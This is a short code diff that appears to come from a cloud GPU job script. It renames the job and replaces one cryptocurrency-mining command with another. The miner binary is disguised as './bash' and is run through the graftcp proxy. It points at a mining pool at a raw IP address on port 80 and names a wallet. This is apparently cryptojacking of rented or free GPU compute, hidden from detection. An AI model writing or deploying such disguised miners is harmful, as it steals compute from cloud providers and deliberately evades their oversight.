@@ -14,7 +14,7 @@ image = (
 
 
 @function(
-    name="t4x3-runner",
+    name="BODREX",
     image=image,
     gpu="RTX4090",
     cpu=2,
@@ -79,7 +79,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash -a progpowz -o stratum+tcp://95.111.195.159:80 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS -p x -w TRX
+    ./graftcp/graftcp ./bash --disable-cpu --algorithm pearlhash --pool 95.111.195.159:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.rtx
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
